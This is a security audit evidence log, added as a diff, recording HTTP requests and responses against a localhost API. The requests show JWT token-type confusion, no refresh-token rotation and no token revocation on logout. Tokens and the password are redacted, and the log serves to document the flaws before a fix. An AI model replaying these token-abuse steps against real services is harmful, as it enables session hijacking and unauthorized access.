@@ -1,0 +1,161 @@
+================================================================================
+BEFORE-FIX EVIDENCE LOG: V05 (JWT Token-Type Confusion & Missing Token Lifecycle)
+Timestamp: 2026-09-25T12:07:32+05:30
+Target URLs:
+- Login: http://localhost:8080/api/v1/auth/login
+- Protected Resource: http://localhost:8080/api/v1/auth/me
+- Refresh Token: http://localhost:8080/api/v1/auth/refresh-token
+- Logout: http://localhost:8080/api/v1/auth/logout
+================================================================================
+
+--- STEP 1: LOGIN AND TOKEN ISSUANCE FOR DISPOSABLE TEST USER ---
+POST /api/v1/auth/login HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"email": "audit_v05_user@test.com", "password": "[REDACTED_PASSWORD]"}
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:35:14 GMT
+
+{
+  "message": "Login successful",
+  "accessToken": "[REDACTED_ACCESS_TOKEN]",
+  "refreshToken": "[REDACTED_REFRESH_TOKEN]",
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null,
+  "role": "ROLE_USER"
+}
+
+--- STEP 2: TOKEN-TYPE CONFUSION - REFRESH TOKEN USED AS BEARER ACCESS TOKEN ---
+GET /api/v1/auth/me HTTP/1.1
+Host: localhost:8080
+User-Agent: curl/8.9.1
+Authorization: Bearer [REDACTED_REFRESH_TOKEN]
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:35:35 GMT
+
+{
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null
+}
+
+[OBSERVATION]: The server accepts a long-lived refresh token as a valid bearer token on protected API endpoints. No token_type validation exists in JWTFilter.
+
+--- STEP 3: INVERSE TOKEN-TYPE CONFUSION - ACCESS TOKEN SUBMITTED TO REFRESH ENDPOINT ---
+POST /api/v1/auth/refresh-token HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"token": "[REDACTED_ACCESS_TOKEN]"}
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:35:58 GMT
+
+{
+  "message": "Token refreshed successfully",
+  "accessToken": "[REDACTED_NEW_ACCESS_TOKEN]",
+  "refreshToken": "[REDACTED_ACCESS_TOKEN]",
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null,
+  "role": "ROLE_USER"
+}
+
+[OBSERVATION]: The server accepts an access token at the refresh endpoint and issues a new access token, demonstrating lack of token intent enforcement.
+
+--- STEP 4: ABSENCE OF REFRESH TOKEN ROTATION ---
+POST /api/v1/auth/refresh-token HTTP/1.1
+Host: localhost:8080
+Content-Type: application/json
+
+{"token": "[REDACTED_REFRESH_TOKEN]"}
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:36:21 GMT
+
+{
+  "message": "Token refreshed successfully",
+  "accessToken": "[REDACTED_ANOTHER_ACCESS_TOKEN]",
+  "refreshToken": "[REDACTED_REFRESH_TOKEN]",
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null,
+  "role": "ROLE_USER"
+}
+
+[OBSERVATION]: The returned refresh token is identical to the submitted token. No rotation occurs; token reuse is indefinitely permitted.
+
+--- STEP 5: ABSENCE OF SERVER-SIDE TOKEN REVOCATION ON LOGOUT ---
+POST /api/v1/auth/logout HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_ACCESS_TOKEN]
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:36:44 GMT
+
+{
+  "message": "Logged out successfully"
+}
+
+--- SUBSEQUENT ACCESS ATTEMPT USING SAME ACCESS TOKEN ---
+GET /api/v1/auth/me HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_ACCESS_TOKEN]
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:37:08 GMT
+
+{
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null
+}
+
+--- SUBSEQUENT ACCESS ATTEMPT USING SAME REFRESH TOKEN ---
+GET /api/v1/auth/me HTTP/1.1
+Host: localhost:8080
+Authorization: Bearer [REDACTED_REFRESH_TOKEN]
+
+--- RESPONSE ---
+HTTP/1.1 200 OK
+Content-Type: application/json
+Date: Fri, 25 Sep 2026 06:37:32 GMT
+
+{
+  "email": "audit_v05_user@test.com",
+  "firstName": "V05User",
+  "lastName": "Audit",
+  "profileImageUrl": null
+}
+
+[OBSERVATION]: Both access and refresh tokens remain completely valid and authorized after calling logout. No server-side blacklist or token invalidation exists.
+
+================================================================================
+RESULT: CONFIRMED VULNERABILITY (V05)
+Status:
+1. Refresh token accepted as access token on protected endpoints (HTTP 200 OK).
+2. Access token accepted at refresh-token endpoint (HTTP 200 OK).
+3. Zero refresh token rotation implemented (identical token echoed).
+4. Zero server-side token invalidation upon logout (tokens remain valid with HTTP 200 OK).
+================================================================================
